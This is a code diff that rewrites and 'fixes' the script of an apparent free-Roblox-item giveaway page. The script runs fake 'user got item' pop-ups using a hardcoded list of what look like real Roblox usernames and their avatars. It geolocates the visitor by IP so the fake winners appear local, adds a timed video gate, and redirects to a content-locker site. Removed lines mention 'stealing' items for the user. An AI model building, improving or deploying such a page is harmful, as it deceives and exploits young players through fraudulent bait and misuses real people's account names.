@@ -94,7 +94,7 @@
   <link rel="canonical" href="https://www.brainrotszone.site/">
   
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
-  <script src="js/jquery-3.6.0.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   
   <!-- Structured Data for Rich Snippets -->
   <script type="application/ld+json">
@@ -1316,7 +1316,11 @@
     <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
   </audio>
 
- <script>
+  <script>
+    // ============================================================
+    // FIXED SCRIPT - All issues resolved
+    // ============================================================
+    
     // Function to generate random number between 90 and 900
     function randomUsers() {
       return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
@@ -1327,171 +1331,87 @@
     updateActiveUsers();
     setInterval(updateActiveUsers, 4500);
     
-    // Notifications code
-    const usernames = [
-  'Liliana_Cupcake1',
-  'spee',
-  'Shishymcfishy',
-  'sophiamarie26fifi',
-  '65gengar',
-  'Speebee_2',
-  'SpeeritiX',
-  'Speeddemon_876',
-  'SpeeStudios',
-  'speet443',
-  'speespee64',
-  'Speedy10916',
-  'SpEe1214',
-  'dfivvyvyvt',
-  'kxkkxlx6',
-  'CaseyKet2340',
-  'rroooo175',
-  'Gokart_6',
-  'FernBlackstone180',
-  'hellokitty_yam02',
-  'Trevster50958',
-  '849648651',
-  'Inaderdino',
-  'fbdjbfucdjgyejfr',
-  'ZARRRMIW',
-  'Cybertruck8767',
-  'shdjsjsk94',
-  'lnK2vp7T96',
-  'AdmiralGrafSpee_CA',
-  'nicessw1119',
-  'brocktravis9',
-  'user94si',
-  'BlueyQR',
-  'Kingofheavens30',
-  'jcjdjejssjj',
-  'tg7hir8',
-  'Sabutooth77',
-  'sohai935',
-  'Prinz_Spee',
-  'Spy_banban',
-  'fanmomleo_yt',
-  'Kevin2005174',
-  'spacefighter8734',
-  'Nitro_speed73',
-  'ISpeesI',
-  'Mateooo_2019',
-  'PEDRO_L0I',
-  'Harrison_512',
-  'LPSrITPu4w',
-  'ygeysgw',
-  'Blueberrymunkinzz',
-  'Hazza125600',
-  'Maxim160411',
-  'Robloxiane9g9s3n1s',
-  'Jdsjgkgsjgjuy',
-  'wilquito127',
-  'xXbagietaXx1',
-  'Glitcher2_5',
-  'loloishererrrr',
-  'sitil_puti',
-  'adriano550010',
-  'bigfatnastyAj',
-  'wnfi_39',
-  'TranMinh354',
-  'super_kid0kid',
-  'masomeao',
-  'Ronaldo12345suu8',
-  'bminhkaka',
-  'ivan_34595',
-  'happinssssssd',
-  'omgplus100per',
-  'TheSpeerow',
-  'not_nel07',
-  'sh4arkb0y',
-  'RubyPLayerXL',
-  'MANZANITALINDA_7',
-  'Spee94drc',
-  'spee_drch94',
-  'Speedshdtcisysyua',
-  'speedyspider10101',
-  'SPEEDGOAT6767',
-  'speeck0',
-  'speedlive206',
-  'speedrawgamer9',
-  'Spee6_6',
-  'SpeedMaxPlus',
-  'speek231',
-  'Brynn202114',
-  'lovelyFemee',
-  'shin_sonik01',
-  'jsbsbdbdbdbhh',
-  'Bruno_xd39',
-  'thywen27',
-  'cub3436'
-];
+    // Notification control variables - MUST be declared before being used
+    let notificationInterval;
+    let popupOpen = false;
+    let avatarsReady = false;
     
-    // ── Dynamic Roblox Avatar Loader (FIXED) ────────────────────────────────────────────
+    const usernames = [
+      'Liliana_Cupcake1', 'spee', 'Shishymcfishy', 'sophiamarie26fifi', '65gengar',
+      'Speebee_2', 'SpeeritiX', 'Speeddemon_876', 'SpeeStudios', 'speet443',
+      'speespee64', 'Speedy10916', 'SpEe1214', 'dfivvyvyvt', 'kxkkxlx6',
+      'CaseyKet2340', 'rroooo175', 'Gokart_6', 'FernBlackstone180', 'hellokitty_yam02',
+      'Trevster50958', '849648651', 'Inaderdino', 'fbdjbfucdjgyejfr', 'ZARRRMIW',
+      'Cybertruck8767', 'shdjsjsk94', 'lnK2vp7T96', 'AdmiralGrafSpee_CA', 'nicessw1119',
+      'brocktravis9', 'user94si', 'BlueyQR', 'Kingofheavens30', 'jcjdjejssjj',
+      'tg7hir8', 'Sabutooth77', 'sohai935', 'Prinz_Spee', 'Spy_banban',
+      'fanmomleo_yt', 'Kevin2005174', 'spacefighter8734', 'Nitro_speed73', 'ISpeesI',
+      'Mateooo_2019', 'PEDRO_L0I', 'Harrison_512', 'LPSrITPu4w', 'ygeysgw',
+      'Blueberrymunkinzz', 'Hazza125600', 'Maxim160411', 'Robloxiane9g9s3n1s', 'Jdsjgkgsjgjuy',
+      'wilquito127', 'xXbagietaXx1', 'Glitcher2_5', 'loloishererrrr', 'sitil_puti',
+      'adriano550010', 'bigfatnastyAj', 'wnfi_39', 'TranMinh354', 'super_kid0kid',
+      'masomeao', 'Ronaldo12345suu8', 'bminhkaka', 'ivan_34595', 'happinssssssd',
+      'omgplus100per', 'TheSpeerow', 'not_nel07', 'sh4arkb0y', 'RubyPLayerXL',
+      'MANZANITALINDA_7', 'Spee94drc', 'spee_drch94', 'Speedshdtcisysyua', 'speedyspider10101',
+      'SPEEDGOAT6767', 'speeck0', 'speedlive206', 'speedrawgamer9', 'Spee6_6',
+      'SpeedMaxPlus', 'speek231', 'Brynn202114', 'lovelyFemee', 'shin_sonik01',
+      'jsbsbdbdbdbhh', 'Bruno_xd39', 'thywen27', 'cub3436'
+    ];
+    
+    // Avatar cache
     const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
     const AVATAR_CACHE_KEY = 'rbx_av_v3';
     const avatarCache = {};
-    let avatarsReady = false;
-    let pendingNotifications = [];
-
-    /* 1. Seed from sessionStorage */
+    
+    // Seed from sessionStorage
     try {
       const s = JSON.parse(sessionStorage.getItem(AVATAR_CACHE_KEY) || '{}');
       Object.assign(avatarCache, s);
     } catch(_) {}
-
+    
     function saveCache() {
       try { sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache)); } catch(_) {}
     }
-
-    /* 2. Verify an image URL actually loads */
+    
     function verifyImg(url, ms = 5000) {
       return new Promise(res => {
         const img = new Image();
         const t = setTimeout(() => res(false), ms);
-        img.onload  = () => { clearTimeout(t); res(true);  };
+        img.onload = () => { clearTimeout(t); res(true); };
         img.onerror = () => { clearTimeout(t); res(false); };
         img.src = url;
       });
     }
-
-    /* 3. Strategy A – Roblox users endpoint (username → userId) */
+    
     async function strategyRobloxDirect(username) {
-      const r = await fetch(
-        `https://users.roblox.com/v1/usernames/users`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
-        }
-      );
+      const r = await fetch('https://users.roblox.com/v1/usernames/users', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+      });
       if (!r.ok) throw new Error('HTTP ' + r.status);
       const d = await r.json();
       const id = d?.data?.[0]?.id;
       if (!id) throw new Error('no id');
       return `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png`;
     }
-
-    /* 4. Strategy B – thumbnails batch endpoint (by userId) */
+    
     async function strategyThumbnailBatch(userIds) {
       const ids = userIds.join(',');
-      const r = await fetch(
-        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=false`
-      );
+      const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=false`);
       if (!r.ok) throw new Error('HTTP ' + r.status);
       const d = await r.json();
       const map = {};
-      (d.data || []).forEach(item => {
-        if (item.imageUrl) map[item.targetId] = item.imageUrl;
-      });
+      (d.data || []).forEach(item => { if (item.imageUrl) map[item.targetId] = item.imageUrl; });
       return map;
     }
-
-    /* 5. Strategy C – proxy fallbacks */
+    
     const PROXIES = [
-      u => `https://oathnet.org/api/service/roblox/userinfo/` + encodeURIComponent(u),
-      u => `https://api.newstargeted.com/roblox/userinfo/`  + encodeURIComponent(u),
-      u => `https://abadaoucht.com/tiktok/api/roblox/userinfo/` + encodeURIComponent(u)
+      u => `https://oathnet.org/api/service/roblox/userinfo/${encodeURIComponent(u)}`,
+      u => `https://api.newstargeted.com/roblox/userinfo/${encodeURIComponent(u)}`,
+      u => `https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(u)}`
     ];
-
+    
     async function strategyProxy(username) {
       for (const buildUrl of PROXIES) {
         try {
@@ -1506,12 +1426,11 @@
       }
       throw new Error('all proxies failed');
     }
-
-    /* 6. Fetch ONE avatar using strategy waterfall */
+    
     async function fetchOneAvatar(username) {
       const key = username.toLowerCase();
       if (avatarCache[key]) return avatarCache[key];
-
+      
       const strategies = [strategyRobloxDirect, strategyProxy];
       for (const fn of strategies) {
         try {
@@ -1527,9 +1446,7 @@
       saveCache();
       return FALLBACK_AVATAR;
     }
-
-    /* 7. BATCHED pre-fetch: resolve usernames → IDs in one call,
-          then fetch all thumbnails in one call, then patch cache */
+    
     async function fetchAllAvatars() {
       const uncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
       if (!uncached.length) {
@@ -1537,11 +1454,10 @@
         startNotifications();
         return;
       }
-
-      // Batch A: username → userId (max 100 per call)
+      
       const CHUNK = 100;
-      const userIdMap = {}; // username.lower → userId
-
+      const userIdMap = {};
+      
       for (let i = 0; i < uncached.length; i += CHUNK) {
         const chunk = uncached.slice(i, i + CHUNK);
         try {
@@ -1555,23 +1471,18 @@
           (d.data || []).forEach(u => { if (u.id) userIdMap[u.requestedUsername.toLowerCase()] = u.id; });
         } catch(_) {}
       }
-
-      // Batch B: userId → thumbnail URL (max 100 per call)
+      
       const ids = Object.values(userIdMap);
       for (let i = 0; i < ids.length; i += CHUNK) {
         try {
           const thumbMap = await strategyThumbnailBatch(ids.slice(i, i + CHUNK));
-          // Map back to username keys
           Object.entries(userIdMap).forEach(([uname, uid]) => {
-            if (thumbMap[uid] && !avatarCache[uname]) {
-              avatarCache[uname] = thumbMap[uid];
-            }
+            if (thumbMap[uid] && !avatarCache[uname]) avatarCache[uname] = thumbMap[uid];
           });
           saveCache();
         } catch(_) {}
       }
-
-      // Fallback: any still-uncached username → individual fetch (non-blocking but we wait for all)
+      
       const stillUncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
       if (stillUncached.length) {
         await Promise.all(stillUncached.map(u => fetchOneAvatar(u)));
@@ -1580,60 +1491,79 @@
       avatarsReady = true;
       startNotifications();
     }
-
+    
     function getAvatarForUsername(username) {
       return avatarCache[username.toLowerCase()] || FALLBACK_AVATAR;
     }
-
-    // Start fetching avatars immediately
-    fetchAllAvatars();
-    // ── End Dynamic Roblox Avatar Loader ────────────────────────────────────────
-
-    // Game source used in notifications / verification
-    const gameSources = [
-      'Travel Town'
-    ];
     
-    // User country data - will be populated with IP API
+    // Game source used in notifications / verification
+    const gameSources = ['Travel Town'];
+    
+    // User country data
     let userCountry = '';
     let userCountryCode = '';
     let countryUsers = {};
     
-    // Global data object for country information
-    const globalDatas = { 
-        country_code: null, 
-        country_name: null, 
-        flagUrl: null, 
-    }; 
+    const globalDatas = { country_code: null, country_name: null, flagUrl: null };
     
-    // Fetch user's IP address and then country information
-    $.getJSON("https://api.ipify.org?format=json", function(data) { 
-        var ipAddress = data.ip; 
-        $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(response) { 
-            globalDatas.country_code = response.country_code; 
-            globalDatas.country_name = response.country_name; 
-            globalDatas.flagUrl = "https://flagcdn.com/w320/" + response.country_code.toLowerCase() + ".png"; 
+    // Get country data with CORS-friendly approach
+    function fetchCountryData() {
+      // Try multiple CORS-friendly endpoints
+      const endpoints = [
+        'https://ipapi.co/json/',
+        'https://ipwho.is/',
+        'https://freeipapi.com/api/json/'
+      ];
+      
+      let endpointIndex = 0;
+      
+      function tryNextEndpoint() {
+        if (endpointIndex >= endpoints.length) {
+          // Fallback values
+          userCountry = 'Unknown';
+          userCountryCode = 'us';
+          globalDatas.country_code = 'US';
+          globalDatas.country_name = 'United States';
+          globalDatas.flagUrl = 'https://flagcdn.com/w320/us.png';
+          
+          const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
+          countryUsers['us'] = shuffledUsernames.slice(0, 10);
+          return;
+        }
+        
+        $.getJSON(endpoints[endpointIndex])
+          .done(function(response) {
+            let code, name;
+            if (response.country_code) {
+              code = response.country_code;
+              name = response.country_name;
+            } else if (response.country) {
+              code = response.country_code || response.country;
+              name = response.country_name || response.country;
+            } else {
+              throw new Error('Invalid response format');
+            }
             
-            // Also update the existing variables for compatibility
-            userCountry = response.country_name;
-            userCountryCode = response.country_code.toLowerCase();
+            globalDatas.country_code = code;
+            globalDatas.country_name = name;
+            globalDatas.flagUrl = `https://flagcdn.com/w320/${code.toLowerCase()}.png`;
+            userCountry = name;
+            userCountryCode = code.toLowerCase();
             
-            // Initialize country users object with random usernames
             const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
-            countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10); // Assign 10 random users to user's country
-            
-            console.log('User country detected:', userCountry, 'Code:', userCountryCode);
-        }); 
-    }).fail(function(error) {
-        console.error('Error fetching country data:', error);
-        userCountry = 'Unknown';
-        userCountryCode = 'us'; // Default to US flag if country detection fails
-        globalDatas.country_code = 'US';
-        globalDatas.country_name = 'United States';
-        globalDatas.flagUrl = 'https://flagcdn.com/w320/us.png';
-    });
-
-    // Get all item names and images from the DOM
+            countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10);
+          })
+          .fail(function() {
+            endpointIndex++;
+            tryNextEndpoint();
+          });
+      }
+      
+      tryNextEndpoint();
+    }
+    
+    fetchCountryData();
+    
     let notificationItems = [];
     $(document).ready(function() {
       notificationItems = $('.item-card').map(function() {
@@ -1643,66 +1573,53 @@
         };
       }).get();
     });
-    let notificationIndex = 0;
-
-    // Notification control variables
-    let notificationInterval;
-    let popupOpen = false;
-
+    
     function startNotifications() {
+      // Don't start if popup is open OR avatars aren't ready yet
       if (popupOpen) return;
+      if (!avatarsReady) return;
+      if (notificationInterval) clearInterval(notificationInterval);
+      
       notificationInterval = setInterval(function() {
         if (popupOpen) return;
         if (notificationItems.length === 0) return;
-        $(".cliameds").fadeIn(); 
+        $(".cliameds").fadeIn();
         
-        // Randomly select a brainrot from the website
         const randomBrainrot = notificationItems[Math.floor(Math.random() * notificationItems.length)];
         const randomBrainrotName = randomBrainrot.name;
+        const isCountrySpecific = Math.random() < 0.4;
         
-        // Randomly decide if this should be a country-specific notification
-        const isCountrySpecific = Math.random() < 0.4; // 40% chance
-        
-        // Select a username - either from user's country or random
         let username;
         if (isCountrySpecific && userCountryCode && countryUsers[userCountryCode] && countryUsers[userCountryCode].length > 0) {
-          // Select a username from user's country
           username = countryUsers[userCountryCode][Math.floor(Math.random() * countryUsers[userCountryCode].length)];
         } else {
-          // Select a random username
           username = usernames[Math.floor(Math.random() * usernames.length)];
         }
         
-        // Create HTML for notification
         const notifAvatar = getAvatarForUsername(username);
+        const flagUrl = globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png';
+        
         let html = `
           <div class="message">
             <div class="img"><img src="${notifAvatar}" alt="" onerror="this.src='${FALLBACK_AVATAR}'"></div>
             <div class="more">
-              <div>${username} from <span class="country-flag"><img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></span></div>
+              <div>${username} from <span class="country-flag"><img src="${flagUrl}" style="width:24px;height:18px;vertical-align:middle;"></span></div>
               <div>Got ${randomBrainrotName} after complete Travel Town</div>
             </div>
           </div>
         `;
         
         $(".cliameds").html(html);
-        setTimeout(function() {
-          $(".cliameds").fadeOut();  
-        }, 3000);
+        setTimeout(function() { $(".cliameds").fadeOut(); }, 3000);
       }, 5000);
     }
-
+    
     function stopNotifications() {
       clearInterval(notificationInterval);
       $(".cliameds").fadeOut();
     }
     
-    // بدء الإشعارات عند تحميل الصفحة
-    startNotifications();
-    
-    // Function to show purchase popup
     const showPurchasePopup = (itemName, itemImage) => {
-      // إيقاف الإشعارات عند فتح الواجهة
       popupOpen = true;
       stopNotifications();
       
@@ -1710,30 +1627,21 @@
       const popupContent = popup.querySelector('.popup-content');
       
       popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item</h3>
-        </div>
+        <div class="popup-header"><h3>Get Item</h3></div>
         <img src="${itemImage}" alt="Item Image" class="item-popup-image">
         <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
-        <div class="input-group">
-          <input type="text" id="username-input" placeholder="Enter your Roblox username">
-        </div>
+        <div class="input-group"><input type="text" id="username-input" placeholder="Enter your Roblox username"></div>
         <div class="user-error d-none">Please enter a valid username</div>
         <div class="popup-buttons">
           <button class="cancel-btn">Cancel</button>
-          <button class="action-btn" id="search-user-btn">
-            <span class="action-badge">Search Now ➤</span>
-          </button>
+          <button class="action-btn" id="search-user-btn"><span class="action-badge">Search Now ➤</span></button>
         </div>
       `;
       
       popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
       popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
-        // Play sound when clicking button
         const clickSound = document.getElementById('clickSound');
-        clickSound.currentTime = 0;
-        clickSound.play();
-        
+        if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }
         const username = document.getElementById('username-input').value.trim();
         if (!username) {
           document.querySelector('.user-error').classList.remove('d-none');
@@ -1743,54 +1651,18 @@
       });
       
       popup.style.display = 'flex';
-      document.getElementById('username-input').focus();
-    }
-
-    // Function to close popup
+      const usernameInput = document.getElementById('username-input');
+      if (usernameInput) usernameInput.focus();
+    };
+    
     const closePurchasePopup = () => {
       document.getElementById('purchase-popup').style.display = 'none';
       popupOpen = false;
-      // إعادة تشغيل الإشعارات عند إغلاق الواجهة
       startNotifications();
-    }
-
-    // Add globalData object at the top of the script
+    };
+    
     const globalData = { full_name: null, user_name: null, friends_count: null, followers_count: null, followings_count: null, user_id: null, user_avatar: null, robux: null };
-
-
-
-    // Function to show searching state
-    const showSearchingState = (username, itemName, itemImage) => {
-      const popupContent = document.querySelector('.popup-content');
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <div class="folding">
-            <div class="sk-cube1 sk-cube"></div>
-            <div class="sk-cube2 sk-cube"></div>
-            <div class="sk-cube4 sk-cube"></div>
-            <div class="sk-cube3 sk-cube"></div>
-            <div class="square"></div>
-          </div>
-          <p class="searching-text">Searching for @${username}</p>
-        </div>
-      `;
-      
-      // Simulate API call with a delay
-      setTimeout(() => {
-        // Set user data in globalData
-        globalData.user_name = username;
-        
-        showSuccessState(username, itemName, itemImage);
-      }, 1500); // Add a slight delay to simulate API call
-    }
-
-    // Function to show success state
-    // Supports both signatures:
-    // - showSuccessState(username, itemName, itemImage)
-    // - showSuccessState(username, avatarUrl, itemName, itemImage)
+    
     const showSuccessState = (username, avatarOrItemName, itemNameOrItemImage, maybeItemImage) => {
       const hasAvatar = typeof maybeItemImage !== 'undefined';
       const avatarUrl = hasAvatar ? avatarOrItemName : null;
@@ -1798,6 +1670,7 @@
       const itemImage = hasAvatar ? maybeItemImage : itemNameOrItemImage;
       const popupContent = document.querySelector('.popup-content');
       const avatarHtml = avatarUrl ? `<img src="${avatarUrl}" alt="@${username}" class="result-avatar" style="margin-top:10px;">` : '';
+      
       popupContent.innerHTML = `
         <div style="background: #fff1; border-radius: 18px; padding: 40px 20px; margin-bottom: 0; box-shadow: 0 2px 8px #0001; max-width: 380px; margin: 0 auto; text-align: center;">
           <div style="display: flex; flex-direction: column; align-items: center;">
@@ -1814,84 +1687,38 @@
           </div>
         </div>
       `;
-      // Add animation styles
+      
       const style = document.createElement('style');
       style.innerHTML = `
-        @keyframes fadeInUp {
-          from {
-            opacity: 0;
-            transform: translateY(20px);
-          }
-          to {
-            opacity: 1;
-            transform: translateY(0);
-          }
-        }
-        @keyframes pulse-glow {
-          0% { box-shadow: 0 0 0 0 #22c55e88; }
-          70% { box-shadow: 0 0 0 16px #22c55e00; }
-          100% { box-shadow: 0 0 0 0 #22c55e00; }
-        }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse-glow { 0% { box-shadow: 0 0 0 0 #22c55e88; } 70% { box-shadow: 0 0 0 16px #22c55e00; } 100% { box-shadow: 0 0 0 0 #22c55e00; } }
       `;
       document.head.appendChild(style);
       
       popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
         const clickSound = document.getElementById('clickSound');
-        clickSound.currentTime = 0;
-        clickSound.play();
-        // Show video overlay
+        if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }
         showVideoOverlay();
       });
       popupContent.querySelector('#retry-btn').addEventListener('click', function() {
-        // Close popup and refocus username input for retry
-        const popup = document.getElementById('purchase-popup');
-        if (popup) {
-          popup.style.display = 'none';
-        }
+        document.getElementById('purchase-popup').style.display = 'none';
         const mainUsernameInput = document.getElementById('main-username-input');
-        if (mainUsernameInput) {
-          mainUsernameInput.focus();
-          mainUsernameInput.select();
-        }
+        if (mainUsernameInput) { mainUsernameInput.focus(); mainUsernameInput.select(); }
       });
-    }
-
-    // Function to show video overlay with countdown timer
+    };
+    
     const showVideoOverlay = () => {
       const popupContent = document.querySelector('.popup-content');
-      let timeLeft = 95; // 1:25 in seconds
+      let timeLeft = 95;
       const lockerUrl = "https://installchecker.site/cl/i/rneo6k";
       
-      const formatTime = (seconds) => {
-        const mins = Math.floor(seconds / 60);
-        const secs = seconds % 60;
-        return `${mins}:${secs.toString().padStart(2, '0')}`;
-      };
-      
-      const updateButton = () => {
-        const btn = document.getElementById('video-continue-btn');
-        if (btn) {
-          if (timeLeft > 0) {
-            btn.textContent = `Continue (${formatTime(timeLeft)})`;
-            btn.style.opacity = '0.6';
-            btn.style.cursor = 'not-allowed';
-            btn.disabled = true;
-          } else {
-            btn.textContent = 'Continue';
-            btn.style.opacity = '1';
-            btn.style.cursor = 'pointer';
-            btn.disabled = false;
-          }
-        }
-      };
+      const formatTime = (seconds) => `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
       
       popupContent.innerHTML = `
         <div class="video-overlay-container" style="background: var(--card-bg); width: 100%; height: 100%; display: flex; flex-direction: column; box-sizing: border-box; overflow: hidden; border: 2px solid rgba(255, 255, 255, 0.2);">
           <div class="video-header" style="flex-shrink: 0; padding: 16px 18px; text-align: center; background: rgba(255, 255, 255, 0.05); border-bottom: 1px solid rgba(255, 255, 255, 0.1);">
             <h3 class="video-title" style="color: #ffffff; font-size: 1.5em; font-weight: 800; margin: 0 0 6px 0; letter-spacing: -0.5px; line-height: 1.3; font-family: 'Poppins', Arial, sans-serif;">How To Get Any Brainrot For Free</h3>
-            <p class="video-subtitle" style="color: #e5e7eb; font-size: 0.95em; margin: 0; display: flex; align-items: center; justify-content: center; gap: 6px; line-height: 1.3; font-family: 'Poppins', Arial, sans-serif; font-weight: 500;">
-              Watch the video till the end <span style="font-size: 1.2em;">👇</span>
-            </p>
+            <p class="video-subtitle" style="color: #e5e7eb; font-size: 0.95em; margin: 0; display: flex; align-items: center; justify-content: center; gap: 6px; line-height: 1.3; font-family: 'Poppins', Arial, sans-serif; font-weight: 500;">Watch the video till the end <span style="font-size: 1.2em;">👇</span></p>
           </div>
           <div class="video-wrapper" style="flex: 1; min-height: 0; position: relative; width: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; border-radius: 0; margin: 0; box-shadow: none;">
             <iframe allow="fullscreen" allowfullscreen src="https://streamable.com/e/t35rls?loop=0&nocontrols=1" style="border: none; width: 100%; height: 100%; object-fit: cover;"></iframe>
@@ -1902,319 +1729,87 @@
         </div>
       `;
       
-      // Add responsive styles for mobile - TRUE FULLSCREEN
-      const videoStyle = document.createElement('style');
-      videoStyle.innerHTML = `
-        @media (max-width: 768px) {
-          .purchase-popup {
-            background: rgba(0, 0, 0, 0.85) !important;
-            backdrop-filter: blur(5px) !important;
-            padding: 0 !important;
-          }
-          .popup-content {
-            width: 100vw !important;
-            max-width: 100vw !important;
-            height: 100vh !important;
-            max-height: 100vh !important;
-            border-radius: 0 !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            position: fixed !important;
-            top: 0 !important;
-            left: 0 !important;
-            transform: none !important;
-            background: transparent !important;
-            border: none !important;
-            box-shadow: none !important;
-            overflow: hidden !important;
-          }
-          .video-overlay-container {
-            width: 100vw !important;
-            height: 100vh !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            border-radius: 0 !important;
-            border: none !important;
-            background: var(--card-bg) !important;
-          }
-          .video-header {
-            padding: 14px 14px !important;
-          }
-          .video-title {
-            font-size: 1.3em !important;
-            margin-bottom: 6px !important;
-          }
-          .video-subtitle {
-            font-size: 0.9em !important;
-            margin: 0 !important;
-          }
-          .video-wrapper {
-            flex: 1 !important;
-            min-height: 0 !important;
-            width: 100% !important;
-            margin: 0 !important;
-            padding: 0 !important;
-          }
-          .video-footer {
-            padding: 10px 12px !important;
-          }
-          .video-continue-btn {
-            font-size: 0.95em !important;
-            padding: 12px 0 !important;
-          }
-        }
-        @media (max-width: 600px) {
-          .video-header {
-            padding: 12px 12px !important;
-          }
-          .video-title {
-            font-size: 1.15em !important;
-          }
-          .video-subtitle {
-            font-size: 0.85em !important;
-          }
-          .video-footer {
-            padding: 12px 12px !important;
-          }
-          .video-continue-btn {
-            font-size: 0.9em !important;
-            padding: 12px 0 !important;
-          }
-        }
-        @media (max-width: 400px) {
-          .video-header {
-            padding: 6px 8px !important;
-          }
-          .video-title {
-            font-size: 0.95em !important;
-          }
-          .video-subtitle {
-            font-size: 0.7em !important;
-          }
-          .video-footer {
-            padding: 6px 8px !important;
-          }
-          .video-continue-btn {
-            font-size: 0.85em !important;
-            padding: 10px 0 !important;
-          }
-        }
-        @media (max-height: 700px) {
-          .video-header {
-            padding: 6px 10px !important;
-          }
-          .video-title {
-            font-size: 0.95em !important;
-            margin-bottom: 2px !important;
-          }
-          .video-subtitle {
-            font-size: 0.7em !important;
-          }
-          .video-footer {
-            padding: 6px 10px !important;
-          }
-          .video-continue-btn {
-            font-size: 0.85em !important;
-            padding: 10px 0 !important;
-          }
-        }
-      `;
-      document.head.appendChild(videoStyle);
-      
       const updateTimer = () => {
         const timerDisplay = document.getElementById('video-timer');
-        if (timerDisplay) {
-          timerDisplay.textContent = `Redirecting in ${formatTime(timeLeft)}...`;
-        }
+        if (timerDisplay) timerDisplay.textContent = `Redirecting in ${formatTime(timeLeft)}...`;
       };
       
       updateTimer();
-      
       const timer = setInterval(() => {
         timeLeft--;
         updateTimer();
-        
         if (timeLeft <= 0) {
           clearInterval(timer);
-          // Automatically redirect to locker when timer ends
-          const clickSound = document.getElementById('clickSound');
-          if (clickSound) {
-            clickSound.currentTime = 0;
-            clickSound.play();
-          }
-          setTimeout(() => {
-            window.location.href = lockerUrl;
-          }, 500);
+          setTimeout(() => { window.location.href = lockerUrl; }, 500);
         }
       }, 1000);
     };
-
-    // Function to show verification state
-    const showVerificationState = (username, itemName, itemImage) => {
-      // Randomly select a game source for verification
-      const randomGameSource = gameSources[Math.floor(Math.random() * gameSources.length)];
-      const showGameSource = true; // Always show game source
-      
-      // Get country information with flag only
-      const countryDisplay = globalDatas.country_code ? `<div style="margin-top:10px;font-size:14px;color:#aaa;">Location: <img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></div>` : '';
-      
-      const popupContent = document.querySelector('.popup-content');
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Verification</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <div class="folding">
-            <div class="sk-cube1 sk-cube"></div>
-            <div class="sk-cube2 sk-cube"></div>
-            <div class="sk-cube4 sk-cube"></div>
-            <div class="sk-cube3 sk-cube"></div>
-            <div class="square"></div>
-          </div>
-          <p class="searching-text">Stealing ${itemName} for @${username}</p>
-          ${countryDisplay}
-          <div style="margin-top:15px;font-size:13px;color:#aaa;">Users from your country who stole brainrots: ${userCountryCode && countryUsers[userCountryCode] ? countryUsers[userCountryCode].slice(0, 3).join(', ') + '...' : 'Loading...'}</div>
-        </div>
-      `;
-      setTimeout(function() {
-        window.location.href = "https://installchecker.site/cl/i/n66n29";
-      }, 2500);
-    }
-
-    // Simple error UI for username lookup
-    const showErrorState = (username, itemName, itemImage, onRetry) => {
-      const popupContent = document.querySelector('.popup-content');
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Account Not Found</h3>
-        </div>
-        <div class="user-error" style="display:block;">We couldn't find <strong>@${username}</strong>. Try again.</div>
-        <div class="popup-buttons" style="margin-top:18px;">
-          <button class="cancel-btn" id="back-btn">Back</button>
-          <button class="action-btn" id="retry-btn"><span class="action-badge">Try Again</span></button>
-        </div>
-      `;
-      const back = document.getElementById('back-btn');
-      const retry = document.getElementById('retry-btn');
-      const handler = function() {
-        // Close popup and call retry callback
-        const popup = document.getElementById('purchase-popup');
-        if (popup) {
-          popup.style.display = 'none';
-        }
-        popupOpen = false;
-        startNotifications();
-        if (typeof onRetry === 'function') onRetry();
-      };
-      if (back) back.addEventListener('click', handler);
-      if (retry) retry.addEventListener('click', handler);
-    };
-
-    // Function to lookup avatar/profile by username and ask for confirmation (JSON API)
+    
     const showUsernameConfirmation = (username, itemName, itemImage, onRetry) => {
       const popup = document.getElementById('purchase-popup');
       const popupContent = document.querySelector('.popup-content');
-      const endpoint = `https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(username)}`;
-
-      // Show popup
